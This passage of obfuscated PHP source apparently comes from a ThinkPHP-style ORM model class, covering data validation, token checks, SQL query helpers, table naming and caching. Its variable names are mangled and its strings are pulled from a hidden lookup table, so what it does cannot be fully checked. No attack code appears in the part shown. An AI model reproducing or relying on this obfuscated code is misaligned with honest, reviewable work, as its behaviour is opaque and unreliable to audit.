$_SERVER[—ÌÒğš÷]; if (empty($ª¿®â¢µ)) { $ª¿®â¢µ = $_POST; } elseif (is_object($ª¿®â¢µ)) { $ª¿®â¢µ = get_object_vars($ª¿®â¢µ); } if (empty($ª¿®â¢µ) || !is_array($ª¿®â¢µ)) { $this->error = think_lang($Š¢çãé¬[315]); return !1; } $ª¿®â¢µ = $this->parseFieldsMap($ª¿®â¢µ, 0); $öØûàíµ = $öØûàíµ ? $öØûàíµ : (!empty($ª¿®â¢µ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Š¢çãé¬[317]])) { $Œë¨ºœÊ = $this->options[$Š¢çãé¬[317]]; unset($this->options[$Š¢çãé¬[317]]); } elseif ($öØûàíµ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Œë¨ºœÊ = $this->insertFields; } elseif ($öØûàíµ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Œë¨ºœÊ = $this->updateFields; } if (isset($Œë¨ºœÊ)) { if (is_string($Œë¨ºœÊ)) { $Œë¨ºœÊ = explode($Š¢çãé¬[50], $Œë¨ºœÊ); } if (think_config($Š¢çãé¬[342])) { $Œë¨ºœÊ[] = think_config($Š¢çãé¬[343]); } foreach ($ª¿®â¢µ as $µèâšË => $—»êŸ–) { if (!in_array($µèâšË, $Œë¨ºœÊ)) { unset($ª¿®â¢µ[$µèâšË]); } } } if (!$this->autoValidation($ª¿®â¢µ, $öØûàíµ)) { return !1; } if (!$this->autoCheckToken($ª¿®â¢µ)) { $this->error = think_lang($Š¢çãé¬[344]); return !1; } if ($this->autoCheckFields) { $Œë¨ºœÊ = $this->getDbFields(); foreach ($ª¿®â¢µ as $µèâšË => $—»êŸ–) { if (!in_array($µèâšË, $Œë¨ºœÊ)) { unset($ª¿®â¢µ[$µèâšË]); } elseif (MAGIC_QUOTES_GPC && is_string($—»êŸ–)) { $ª¿®â¢µ[$µèâšË] = stripslashes($—»êŸ–); } } } $this->autoOperation($ª¿®â¢µ, $öØûàíµ); $this->data = $ª¿®â¢µ; return $ª¿®â¢µ; } public function autoCheckToken($„¯‡‹éº) { $À¥†‚÷ =& $_SERVER[—ÌÒğš÷]; if (isset($this->options[$À¥†‚÷[345]]) && !$this->options[$À¥†‚÷[345]]) { return !0; } if (think_config($À¥†‚÷[342])) { $¤ìÎ®¼ë = think_config($À¥†‚÷[343]); if (!isset($„¯‡‹éº[$¤ìÎ®¼ë]) || Session::get($¤ìÎ®¼ë)) { return !1; } list($¿™ˆ°µí, $ô«²¤ßô) = explode($À¥†‚÷[11], $„¯‡‹éº[$¤ìÎ®¼ë]); if ($ô«²¤ßô && Session::get($¤ìÎ®¼ë . $À¥†‚÷[10] . $¿™ˆ°µí) === $ô«²¤ßô) { Session::remove($¤ìÎ®¼ë . $À¥†‚÷[10] . $¿™ˆ°µí); return !0; } if (think_config($À¥†‚÷[346])) { Session::remove($¤ìÎ®¼ë . $À¥†‚÷[10] . $¿™ˆ°µí); } return !1; } return !0; } public function regex($‡²ÈÕ­É, $µ’¾Â¸…) { $ üÃ‡Ñõ =& $_SERVER[—ÌÒğš÷]; $Óü›İ¸Ç = array($ üÃ‡Ñõ[347] => $ üÃ‡Ñõ[348], $ üÃ‡Ñõ[349] => $ üÃ‡Ñõ[350], $ üÃ‡Ñõ[351] => $ üÃ‡Ñõ[352], $ üÃ‡Ñõ[353] => $ üÃ‡Ñõ[354], $ üÃ‡Ñõ[355] => $ üÃ‡Ñõ[356], $ üÃ‡Ñõ[357] => $ üÃ‡Ñõ[358], $ üÃ‡Ñõ[359] => $ üÃ‡Ñõ[360], $ üÃ‡Ñõ[334] => $ üÃ‡Ñõ[361], $ üÃ‡Ñõ[362] => $ üÃ‡Ñõ[363]); if (isset($Óü›İ¸Ç[strtolower($µ’¾Â¸…)])) { $µ’¾Â¸… = $Óü›İ¸Ç[strtolower($µ’¾Â¸…)]; } return preg_match($µ’¾Â¸…, $‡²ÈÕ­É) === 1; } private function autoOperation(&$›¿Éîæï, $Ø³ßé¤Ù) { $¸”¹»óÄ =& $_SERVER[—ÌÒğš÷]; if (!empty($this->options[$¸”¹»óÄ[364]])) { $‹ºİ© = $this->options[$¸”¹»óÄ[364]]; unset($this->options[$¸”¹»óÄ[364]]); } elseif (!empty($this->_auto)) { $‹ºİ© = $this->_auto; } if (isset($‹ºİ©)) { foreach ($‹ºİ© as $öÜş»Õ) { if (empty($öÜş»Õ[2])) { $öÜş»Õ[2] = THINK_MODEL_INSERT; } if ($Ø³ßé¤Ù == $öÜş»Õ[2] || $öÜş»Õ[2] == THINK_MODEL_BOTH) { switch (trim($öÜş»Õ[3])) { case $¸”¹»óÄ[365]: case $¸”¹»óÄ[366]: $×ÆìáÇ¢ = isset($öÜş»Õ[4]) ? (array) $öÜş»Õ[4] : array(); if (isset($›¿Éîæï[$öÜş»Õ[0]])) { array_unshift($×ÆìáÇ¢, $›¿Éîæï[$öÜş»Õ[0]]); } if ($¸”¹»óÄ[365] == $öÜş»Õ[3]) { $›¿Éîæï[$öÜş»Õ[0]] = call_user_func_array($öÜş»Õ[1], $×ÆìáÇ¢); } else { $›¿Éîæï[$öÜş»Õ[0]] = call_user_func_array(array(&$this, $öÜş»Õ[1]), $×ÆìáÇ¢); } break; case $¸”¹»óÄ[317]: $›¿Éîæï[$öÜş»Õ[0]] = $›¿Éîæï[$öÜş»Õ[1]]; break; case $¸”¹»óÄ[367]: if ($¸”¹»óÄ[12] === $›¿Éîæï[$öÜş»Õ[0]]) { unset($›¿Éîæï[$öÜş»Õ[0]]); } break; case $¸”¹»óÄ[368]: default: $›¿Éîæï[$öÜş»Õ[0]] = $öÜş»Õ[1]; } if (!1 === $›¿Éîæï[$öÜş»Õ[0]]) { unset($›¿Éîæï[$öÜş»Õ[0]]); } } } } return $›¿Éîæï; } protected function autoValidation($ÙÖ‹í¹×, $œÆ¢ ±) { $Â‰µæ‹ =& $_SERVER[—ÌÒğš÷]; if (!empty($this->options[$Â‰µæ‹[369]])) { $­©ñï×ˆ = $this->options[$Â‰µæ‹[369]]; unset($this->options[$Â‰µæ‹[369]]); } elseif (!empty($this->_validate)) { $­©ñï×ˆ = $this->_validate; } if (isset($­©ñï×ˆ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($­©ñï×ˆ as $ºÆåáç× => $ãÊÂøèÚ) { if (empty($ãÊÂøèÚ[5]) || $ãÊÂøèÚ[5] == THINK_MODEL_BOTH || $ãÊÂøèÚ[5] == $œÆ¢ ±) { if (0 == strpos($ãÊÂøèÚ[2], $Â‰µæ‹[370]) && strpos($ãÊÂøèÚ[2], $Â‰µæ‹[371])) { $ãÊÂøèÚ[2] = think_lang(substr($ãÊÂøèÚ[2], 2, -1)); } $ãÊÂøèÚ[3] = isset($ãÊÂøèÚ[3]) ? $ãÊÂøèÚ[3] : THINK_EXISTS_VALIDATE; $ãÊÂøèÚ[4] = isset($ãÊÂøèÚ[4]) ? $ãÊÂøèÚ[4] : $Â‰µæ‹[372]; switch ($ãÊÂøèÚ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÙÖ‹í¹×, $ãÊÂøèÚ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Â‰µæ‹[12] != trim($ÙÖ‹í¹×[$ãÊÂøèÚ[0]])) { if (!1 === $this->_validationField($ÙÖ‹í¹×, $ãÊÂøèÚ)) { return !1; } } break; default: if (isset($ÙÖ‹í¹×[$ãÊÂøèÚ[0]])) { if (!1 === $this->_validationField($ÙÖ‹í¹×, $ãÊÂøèÚ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ì‚İ–¸Œ, $ã†À¡„) { if (!1 === $this->_validationFieldItem($Ì‚İ–¸Œ, $ã†À¡„)) { if ($this->patchValidate) { $this->error[$ã†À¡„[0]] = $ã†À¡„[2]; } else { $this->error = $ã†À¡„[2]; return !1; } } return; } protected function _validationFieldItem($Ş¶ÑÇ‰‰, $ÖÔ¨ĞŠì) { $ÓåÖáÎî =& $_SERVER[—ÌÒğš÷]; switch (strtolower(trim($ÖÔ¨ĞŠì[4]))) { case $ÓåÖáÎî[365]: case $ÓåÖáÎî[366]: $ü¾‡ø¯ = isset($ÖÔ¨ĞŠì[6]) ? (array) $ÖÔ¨ĞŠì[6] : array(); if (is_string($ÖÔ¨ĞŠì[0]) && strpos($ÖÔ¨ĞŠì[0], $ÓåÖáÎî[50])) { $ÖÔ¨ĞŠì[0] = explode($ÓåÖáÎî[50], $ÖÔ¨ĞŠì[0]); } if (is_array($ÖÔ¨ĞŠì[0])) { foreach ($ÖÔ¨ĞŠì[0] as $ñù‡Å) { $ÌÇÒî¿½[$ñù‡Å] = $Ş¶ÑÇ‰‰[$ñù‡Å]; } array_unshift($ü¾‡ø¯, $ÌÇÒî¿½); } else { array_unshift($ü¾‡ø¯, $Ş¶ÑÇ‰‰[$ÖÔ¨ĞŠì[0]]); } if ($ÓåÖáÎî[365] == $ÖÔ¨ĞŠì[4]) { return call_user_func_array($ÖÔ¨ĞŠì[1], $ü¾‡ø¯); } else { return call_user_func_array(array(&$this, $ÖÔ¨ĞŠì[1]), $ü¾‡ø¯); } case $ÓåÖáÎî[373]: return $Ş¶ÑÇ‰‰[$ÖÔ¨ĞŠì[0]] == $Ş¶ÑÇ‰‰[$ÖÔ¨ĞŠì[1]]; case $ÓåÖáÎî[374]: if (is_string($ÖÔ¨ĞŠì[0]) && strpos($ÖÔ¨ĞŠì[0], $ÓåÖáÎî[50])) { $ÖÔ¨ĞŠì[0] = explode($ÓåÖáÎî[50], $ÖÔ¨ĞŠì[0]); } $¬Ôü¡îŸ = array(); if (is_array($ÖÔ¨ĞŠì[0])) { foreach ($ÖÔ¨ĞŠì[0] as $ñù‡Å) { $¬Ôü¡îŸ[$ñù‡Å] = $Ş¶ÑÇ‰‰[$ñù‡Å]; } } else { $¬Ôü¡îŸ[$ÖÔ¨ĞŠì[0]] = $Ş¶ÑÇ‰‰[$ÖÔ¨ĞŠì[0]]; } if (!empty($Ş¶ÑÇ‰‰[$this->getPk()])) { $¬Ôü¡îŸ[$this->getPk()] = array($ÓåÖáÎî[375], $Ş¶ÑÇ‰‰[$this->getPk()]); } if ($this->where($¬Ôü¡îŸ)->find()) { return !1; } return !0; default: return $this->check($Ş¶ÑÇ‰‰[$ÖÔ¨ĞŠì[0]], $ÖÔ¨ĞŠì[1], $ÖÔ¨ĞŠì[4]); } } public function check($íˆôÖ»Ğ, $Ø‡êÇçü, $ÏŸß¿§¯ = "\162\145\x67\x65\170") { $êßÚïÑ‰ =& $_SERVER[—ÌÒğš÷]; $ÏŸß¿§¯ = strtolower(trim($ÏŸß¿§¯)); switch ($ÏŸß¿§¯) { case $êßÚïÑ‰[7]: case $êßÚïÑ‰[376]: $ÌÈ°˜” = is_array($Ø‡êÇçü) ? $Ø‡êÇçü : explode($êßÚïÑ‰[50], $Ø‡êÇçü); return $ÏŸß¿§¯ == $êßÚïÑ‰[7] ? in_array($íˆôÖ»Ğ, $ÌÈ°˜”) : !in_array($íˆôÖ»Ğ, $ÌÈ°˜”); case $êßÚïÑ‰[377]: case $êßÚïÑ‰[378]: if (is_array($Ø‡êÇçü)) { $œ Ø£´ƒ = $Ø‡êÇçü[0]; $†ô¦ÇÚ› = $Ø‡êÇçü[1]; } else { list($œ Ø£´ƒ, $†ô¦ÇÚ›) = explode($êßÚïÑ‰[50], $Ø‡êÇçü); } return $ÏŸß¿§¯ == $êßÚïÑ‰[377] ? $íˆôÖ»Ğ >= $œ Ø£´ƒ && $íˆôÖ»Ğ <= $†ô¦ÇÚ› : $íˆôÖ»Ğ < $œ Ø£´ƒ || $íˆôÖ»Ğ > $†ô¦ÇÚ›; case $êßÚïÑ‰[379]: case $êßÚïÑ‰[380]: return $ÏŸß¿§¯ == $êßÚïÑ‰[379] ? $íˆôÖ»Ğ == $Ø‡êÇçü : $íˆôÖ»Ğ != $Ø‡êÇçü; case $êßÚïÑ‰[381]: $ó‹‰ƒ†ü = mb_strlen($íˆôÖ»Ğ, $êßÚïÑ‰[382]); if (strpos($Ø‡êÇçü, $êßÚïÑ‰[50])) { list($œ Ø£´ƒ, $†ô¦ÇÚ›) = explode($êßÚïÑ‰[50], $Ø‡êÇçü); return $ó‹‰ƒ†ü >= $œ Ø£´ƒ && $ó‹‰ƒ†ü <= $†ô¦ÇÚ›; } else { return $ó‹‰ƒ†ü == $Ø‡êÇçü; } case $êßÚïÑ‰[383]: list($ç†Ğ‡é´, $‡‰èŠÔ²) = explode($êßÚïÑ‰[50], $Ø‡êÇçü); if (!is_numeric($ç†Ğ‡é´)) { $ç†Ğ‡é´ = strtotime($ç†Ğ‡é´); } if (!is_numeric($‡‰èŠÔ²)) { $‡‰èŠÔ² = strtotime($‡‰èŠÔ²); } return NOW_TIME >= $ç†Ğ‡é´ && NOW_TIME <= $‡‰èŠÔ²; case $êßÚïÑ‰[384]: return in_array(get_client_ip(), explode($êßÚïÑ‰[50], $Ø‡êÇçü)); case $êßÚïÑ‰[385]: return !in_array(get_client_ip(), explode($êßÚïÑ‰[50], $Ø‡êÇçü)); case $êßÚïÑ‰[372]: default: return $this->regex($íˆôÖ»Ğ, $Ø‡êÇçü); } } public function query($ø½¡Ïµê, $ü¨ƒãÅ§ = false) { $™…õÁÀ =& $_SERVER[—ÌÒğš÷]; if (!is_bool($ü¨ƒãÅ§) && !is_array($ü¨ƒãÅ§)) { $ü¨ƒãÅ§ = func_get_args(); array_shift($ü¨ƒãÅ§); } $ø½¡Ïµê = str_replace(array($™…õÁÀ[246], $™…õÁÀ[386]), $™…õÁÀ[53], $ø½¡Ïµê); $ø½¡Ïµê = $this->parseSql($ø½¡Ïµê, $ü¨ƒãÅ§); return $this->db->query($ø½¡Ïµê); } public function execute($ÊŸ Ê¨ä, $ÚÎ£Ê«œ = false) { if (!is_bool($ÚÎ£Ê«œ) && !is_array($ÚÎ£Ê«œ)) { $ÚÎ£Ê«œ = func_get_args(); array_shift($ÚÎ£Ê«œ); } $ÊŸ Ê¨ä = $this->parseSql($ÊŸ Ê¨ä, $ÚÎ£Ê«œ); return $this->db->execute($ÊŸ Ê¨ä); } protected function parseSql($¥¢˜†§ü, $ˆ¥ »î) { $ãç–ÈÏ¨ =& $_SERVER[—ÌÒğš÷]; if (!0 === $ˆ¥ »î) { $ÖÖµñ€å = $this->_parseOptions(); $¥¢˜†§ü = $this->db->parseSql($¥¢˜†§ü, $ÖÖµñ€å); } elseif (is_array($ˆ¥ »î)) { $ˆ¥ »î = array_map(array($this->db, $ãç–ÈÏ¨[387]), $ˆ¥ »î); $¥¢˜†§ü = vsprintf($¥¢˜†§ü, $ˆ¥ »î); } else { $¥¢˜†§ü = strtr($¥¢˜†§ü, array($ãç–ÈÏ¨[388] => $this->getTableName(), $ãç–ÈÏ¨[389] => think_config($ãç–ÈÏ¨[288]))); } $this->db->setModel($this->name); return $¥¢˜†§ü; } public function db($œÓ–ªÙ‚ = '', $—Ô„öÓ = '', $’«ˆ—Ë® = array()) { $î©¯É™ =& $_SERVER[—ÌÒğš÷]; if ($î©¯É™[12] === $œÓ–ªÙ‚ && $this->db) { return $this->db; } static $¡¦œ‚ï£ = array(); static $¼Ëë‡ôõ = array(); if (!isset($¼Ëë‡ôõ[$œÓ–ªÙ‚]) || isset($¼Ëë‡ôõ[$œÓ–ªÙ‚]) && $—Ô„öÓ && $¡¦œ‚ï£[$œÓ–ªÙ‚] != $—Ô„öÓ) { if (!empty($—Ô„öÓ) && is_string($—Ô„öÓ) && !1 === strpos($—Ô„öÓ, $î©¯É™[8])) { $—Ô„öÓ = think_config($—Ô„öÓ); } $œÓ–ªÙ‚ = think_guid($—Ô„öÓ); $¼Ëë‡ôõ[$œÓ–ªÙ‚] = Db::getInstance($—Ô„öÓ); } elseif (NULL === $—Ô„öÓ) { $¼Ëë‡ôõ[$œÓ–ªÙ‚]->close(); unset($¼Ëë‡ôõ[$œÓ–ªÙ‚]); return; } if (!empty($’«ˆ—Ë®)) { if (is_string($’«ˆ—Ë®)) { parse_str($’«ˆ—Ë®, $’«ˆ—Ë®); } foreach ($’«ˆ—Ë® as $Ê„¶Ì¬ => $³ïúÜù±) { $this->setProperty($Ê„¶Ì¬, $³ïúÜù±); } } $¡¦œ‚ï£[$œÓ–ªÙ‚] = $—Ô„öÓ; $this->db = $¼Ëë‡ôõ[$œÓ–ªÙ‚]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $îŞß”Î÷ = get_class($this); if ($îŞß”Î÷ == $_SERVER[—ÌÒğš÷][390]) { return $this->name; } $this->name = substr($îŞß”Î÷, 0, -5); } return $this->name; } public function getTableName() { $Ù–àŸ“¶ =& $_SERVER[—ÌÒğš÷]; if (empty($this->trueTableName)) { $–­Ûô‹ª = !empty($this->tablePrefix) ? $this->tablePrefix : $Ù–àŸ“¶[12]; if (!empty($this->tableName)) { $–­Ûô‹ª .= $this->tableName; } else { $–­Ûô‹ª .= think_parse_name($this->name); } $this->trueTableName = strtolower($–­Ûô‹ª); } return (!empty($this->dbName) ? $this->dbName . $Ù–àŸ“¶[10] : $Ù–àŸ“¶[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $§ô½¡—§ =& $_SERVER[—ÌÒğš÷]; return isset($this->fields[$§ô½¡—§[295]]) ? $this->fields[$§ô½¡—§[295]] : $this->pk; } public function getDbFields() { $××âÛ€ =& $_SERVER[—ÌÒğš÷]; if (isset($this->options[$××âÛ€[323]])) { $´Á…ßúÒ = $this->db->getFields($this->options[$××âÛ€[323]]); return $´Á…ßúÒ ? array_keys($´Á…ßúÒ) : !1; } if ($this->fields) { $´Á…ßúÒ = $this->fields; unset($´Á…ßúÒ[$××âÛ€[294]], $´Á…ßúÒ[$××âÛ€[295]], $´Á…ßúÒ[$××âÛ€[296]], $´Á…ßúÒ[$××âÛ€[293]]); return $´Á…ßúÒ; } return !1; } public function data($êæ°Ã˜ = '') { $Á´çâ¨Û =& $_SERVER[—ÌÒğš÷]; if ($Á´çâ¨Û[12] === $êæ°Ã˜ && !empty($this->data)) { return $this->data; } if (is_object($êæ°Ã˜)) { $êæ°Ã˜ = get_object_vars($êæ°Ã˜); } elseif (is_string($êæ°Ã˜)) { parse_str($êæ°Ã˜, $êæ°Ã˜); } elseif (!is_array($êæ°Ã˜)) { think_exception(think_lang($Á´çâ¨Û[315])); } $this->data = $êæ°Ã˜; return $this; } public function join($ÚÊè˜øÙ) { $éÑ„ÛºÚ =& $_SERVER[—ÌÒğš÷]; if (is_array($ÚÊè˜øÙ)) { $this->options[$éÑ„ÛºÚ[326]] = $ÚÊè˜øÙ; } elseif (!empty($ÚÊè˜øÙ)) { $this->options[$éÑ„ÛºÚ[326]][] = $ÚÊè˜øÙ; } return $this; } public function union($•À¸©ôŞ, $­éù†É˜ = false) { $î…êïİİ =& $_SERVER[—ÌÒğš÷]; if (empty($•À¸©ôŞ)) { return $this; } if ($­éù†É˜) { $this->options[$î…êïİİ[391]][$î…êïİİ[392]] = !0; } if (is_object($•À¸©ôŞ)) { $•À¸©ôŞ = get_object_vars($•À¸©ôŞ); } if (is_string($•À¸©ôŞ)) { $ÃÃÆ±µ‡ = $•À¸©ôŞ; } elseif (is_array($•À¸©ôŞ)) { if (isset($•À¸©ôŞ[0])) { $this->options[$î…êïİİ[391]] = array_merge($this->options[$î…êïİİ[391]], $•À¸©ôŞ); return $this; } else { $ÃÃÆ±µ‡ = $•À¸©ôŞ; } } else { think_exception(think_lang($î…êïİİ[315])); } $this->options[$î…êïİİ[391]][] = $ÃÃÆ±µ‡; return $this; } public function cache($åúùÍ°Œ = true, $âº¦‘² = null, $íÑÒ€Ğ = '') { $‡²Ï’Î =& $_SERVER[—ÌÒğš÷]; if (!1 !== $åúùÍ°Œ) { $this->options[$‡²Ï’Î[393]] = array($‡²Ï’Î[94] => $åúùÍ°Œ, $‡²Ï’Î[383] => $âº¦‘², $‡²Ï’Î[33] => $íÑÒ€Ğ); } return $this; } public function field($§› èÊû, $»ìÉ»Ë‚ = false) { $Öƒ±¡ØÓ =& $_SERVER[—ÌÒğš÷]; if (!0 === $§› èÊû) { $íÏçÃû = $this->getDbFields(); $§› èÊû = $íÏçÃû ? $íÏçÃû : $Öƒ±¡ØÓ[203]; } elseif ($»ìÉ»Ë‚) { if (is_string($§› èÊû)) { $§› èÊû = explode($Öƒ±¡ØÓ[50], $§› èÊû); } $íÏçÃû = $this->getDbFields(); $§› èÊû = $íÏçÃû ? array_diff($íÏçÃû, $§› èÊû) : $§› èÊû; } $this->options[$Öƒ±¡ØÓ[317]] = $§› èÊû; return $this; } public function scope($²§ØœşÕ = '', $Ã­÷ÕÒ = NULL) { $°®±Æˆ =& $_SERVER[—ÌÒğš÷]; if ($°®±Æˆ[12] === $²§ØœşÕ) { if (isset($this->_scope[$°®±Æˆ[37]])) { $©Çøî‚Ó = $this->_scope[$°®±Æˆ[37]]; } else { return $this; } } elseif (is_string($²§ØœşÕ)) { $ËØÌÃÎ¡ = explode($°®±Æˆ[50], $²§ØœşÕ); $©Çøî‚Ó = array(); foreach ($ËØÌÃÎ¡ as $öš¤Óè©) { if (!isset($this->_scope[$öš¤Óè©])) { continue; } $©Çøî‚Ó = array_merge($©Çøî‚Ó, $this->_scope[$öš¤Óè©]); } if (!empty($Ã­÷ÕÒ) && is_array($Ã­÷ÕÒ)) { $©Çøî‚Ó = array_merge($©Çøî‚Ó, $Ã­÷ÕÒ); } } elseif (is_array($²§ØœşÕ)) { $©Çøî‚Ó = $²§ØœşÕ; } if (is_array($©Çøî‚Ó) && !empty($©Çøî‚Ó)) { $this->options = array_merge($this->options, array_change_key_case($©Çøî‚Ó)); } return $this; } public function where($ö¨„›ç°, $­½ÏÌ° = null) { $½âë€ =& $_SERVER[—ÌÒğš÷]; if (!is_null($­½ÏÌ°) && is_string($ö¨„›ç°)) { if (!is_array($­½ÏÌ°)) { $­½ÏÌ° = func_get_args(); array_shift($­½ÏÌ°); } $­½ÏÌ° = array_map(array($this->db, $½âë€[387]), $­½ÏÌ°); $ö¨„›ç° = vsprintf($ö¨„›ç°, $­½ÏÌ°); } elseif (is_object($ö¨„›ç°)) { $ö¨„›ç° = get_object_vars($ö¨„›ç°); } elseif (is_array($ö¨„›ç°)) { foreach ($ö¨„›ç° as $½ÀÍéÍ” => $“ƒŒ†Á‹) { if ((is_numeric($½ÀÍéÍ”) || !$½ÀÍéÍ”) && is_string($“ƒŒ†Á‹)) { if (strpos($“ƒŒ†Á‹, $½âë€[394]) === 0) { continue; } think_trace($½âë€[395], $½âë€[12], $½âë€[49]); die; } } } if (is_string($ö¨„›ç°) && $½âë€[12] != $ö¨„›ç°) { $½»²…“˜ = array(); $½»²…“˜[$½âë€[396]] = $ö¨„›ç°; $ö¨„›ç° = $½»²…“˜; } if (isset($this->options[$½âë€[319]])) { $this->options[$½âë€[319]] = array_merge($this->options[$½âë€[319]], $ö¨„›ç°); } else { $this->options[$½âë€[319]] = $ö¨„›ç°; } return $this; } public function limit($ÂôÊóûç, $Òä›—Âì = null) { $•Ìòª¤ =& $_SERVER[—ÌÒğš÷]; $this->options[$•Ìòª¤[336]] = is_null($Òä›—Âì) ? $ÂôÊóûç : $ÂôÊóûç . $•Ìòª¤[50] . $Òä›—Âì; return $this; } public function page($‹ÅØªí, $èÂÉ¨ïÃ = null) { $™Û²ó³ =& $_SERVER[—ÌÒğš÷]; $this->options[$™Û²ó³[397]] = is_null($èÂÉ¨ïÃ) ? $‹ÅØªí : $‹ÅØªí . $™Û²ó³[50] . $èÂÉ¨ïÃ; return $this; } public function comment($æä’‰û) { $this->options[$_SERVER[—ÌÒğš÷][398]] = $æä’‰û; return $this; } public function setProperty($†­Øóòü, $½ê½­Ë) { if (property_exists($this, $†­Øóòü)) { $this->{$†­Øóòü} = $½ê½­Ë; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\151\x6d\x65", "\164\151\155\145", "\151\x6e\163\x65\162\x74\x2c\x75\x70\144\141\x74\x65", "\146\x75\156\143\x74\x69\157\x6e"), array("\x63\162\145\141\x74\145\124\151\x6d\145", "\164\151\x6d\145", "\151\x6e\163\145\x72\164", "\146\165\x6e\143\x74\151\x6f\156")); public function setDataAuto($¦Ï×ö÷›) { $this->dataAuto = $¦Ï×ö÷›; } public function __construct($ïµ§‚ØÊ = '', $À‹û˜Ï¤ = '', $îúÍ¦Ò¼ = '') { parent::__construct($ïµ§‚ØÊ, $À‹û˜Ï¤, $îúÍ¦Ò¼); } protected $tableMeta = array(); protected function _beforeInsert(&$‡È÷É¯Ò, $É±şÑØô) { $â´»†Î =& $_SERVER[—ÌÒğš÷]; if (!$this->checkDataAutoHas($â´»†Î[399])) { return; } $this->dataBeforeFilter($‡È÷É¯Ò, $â´»†Î[399]); } protected function _beforeUpdate(&$ğı³èİ×, $¢¸”óå) { $¹ÎŠŸò =& $_SERVER[—ÌÒğš÷]; if (!$this->checkDataAutoHas($¹ÎŠŸò[400])) { return; } $this->dataBeforeFilter($ğı³èİ×, $¹ÎŠŸò[400]); } protected function _afterSelect(&$ÀêÕˆƒ¨, $¯Áã’İ¹) { if (!is_array($ÀêÕˆƒ¨)) { return; } if (!$this->checkDataAutoHas($_SERVER[—ÌÒğš÷][401])) { return; } foreach ($ÀêÕˆƒ¨ as &$ÅŸ´‹) { $this->dataAfterFilter($ÅŸ´‹); } unset($ÅŸ´‹); } protected function _afterFind(&$ªş´µáı, $­›™»ŠÁ) { if (!is_array($ªş´µáı)) { return; } if (!$this->checkDataAutoHas($_SERVER[—ÌÒğš÷][401])) { return; } $this->dataAfterFilter($ªş´µáı); } public static function textEncode($æ»ìÜâ) { if (!$æ»ìÜâ) { return $æ»ìÜâ; } $ÖÚ…ûÄ© = json_encode($æ»ìÜâ); $ÖÚ…ûÄ© = preg_replace_callback($_SERVER[—ÌÒğš÷][402], function ($˜øÂ¾­) { return addslashes($˜øÂ¾­[0]); }, $ÖÚ…ûÄ©); return json_decode($ÖÚ…ûÄ©); } public static function textDecode($¿¦²ÛíÛ) { $ˆúáÀİ =& $_SERVER[—ÌÒğš÷]; $’·ƒÏåì = json_encode($¿¦²ÛíÛ); $’·ƒÏåì = preg_replace_callback($ˆúáÀİ[403], function ($³­ª¹—Å) { return $_SERVER[—ÌÒğš÷][97]; }, $’·ƒÏåì); return json_decode($’·ƒÏåì); } public function setAutoIncrement($šÊ›½ô) { $ŠŸŒ¦è = array($this->getPk() => $šÊ›½ô); $‰‡‰†…´ = $this->data($ŠŸŒ¦è)->add(); if ($‰‡‰†…´) { $this->delete($‰‡‰†…´); } } public function getAutoIncrement() { $ŠíİŸ×Á = $this->getTableName(); $™œæ©• = $this->max($this->getPk()); $ÊÕ”îø = $this->query("\x73\x68\157\x77\40\x74\141\x62\154\145\x20\x73\164\x61\x74\165\x73\x20\167\150\x65\162\145\x20\116\141\x6d\145\75\x27{$ŠíİŸ×Á}\x27"); $­³×§ä = $ÊÕ”îø[0][$_SERVER[—ÌÒğš÷][404]]; $¡½”±… = max($™œæ©•, $­³×§ä); return $¡½”±…; } protected function _callBefore($º€Èüµ¨, $õØä¿Üü) { return $this->cacheCallCheck($º€Èüµ¨, $õØä¿Üü, !1); } protected function _callAfter($ùì¸Üï¢, $êÖäĞ›Â) { return $this->cacheCallCheck($ùì¸Üï¢, $êÖäĞ›Â, !0); } protected function cacheFunctionAlias($ «­È¸í) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¯•òÔ´, $ğÄÏÇºÒ, $ÇÊ˜óë÷ = false) { $÷ûŸâô = $this->cacheFunctionAlias($ğÄÏÇºÒ); if (!$÷ûŸâô) { return; } foreach ($÷ûŸâô as $Æ´ÁŞèÄ => $ÔŒÙÛÔé) { $ÃíåŠû… = $ÔŒÙÛÔé[0]; $ÑÒ£˜…É = explode($_SERVER[—ÌÒğš÷][50], $ÔŒÙÛÔé[1]); if ($¯•òÔ´ == $Æ´ÁŞèÄ) { return $this->cacheFunctionGet($Æ´ÁŞèÄ, $ÃíåŠû…); } if ($ÇÊ˜óë÷ && in_array($¯•òÔ´, $ÑÒ£˜…É)) { $this->cacheFunctionClear($Æ´ÁŞèÄ, $ÃíåŠû…); } } } public function cacheFunctionGet($«Üû‘½, $ş³¶Ë¡×) { $Âºìû¸ú = $this->cacheKeyMake($«Üû‘½, $ş³¶Ë¡×); $¶õ‡á½ = Cache::get($Âºìû¸ú); if (!is_array($¶õ‡á½)) { $¶õ‡á½ = call_user_func_array(array($this, $«Üû‘½), array($ş³¶Ë¡×, !0)); Cache::set($Âºìû¸ú, $¶õ‡á½); } return $¶õ‡á½; } public function cacheFunctionClear($¤º¯ÄüÂ, $Æ˜´®×Ú) { $šœœ„„ = $Æ˜´®×Ú; if (!is_array($Æ˜´®×Ú)) { $šœœ„„ = array($Æ˜´®×Ú); } foreach ($šœœ„„ as $ê½…ÑÛ) { $¬Ğù™•Ù = $this->cacheKeyMake($¤º¯ÄüÂ, $ê½…ÑÛ); Cache::remove($¬Ğù™•Ù); } } private function cacheKeyMake($§£ôàÊÙ, $ŞïË½òì) { $ÕÎÏƒ…Î =& $_SERVER[—ÌÒğš÷]; return 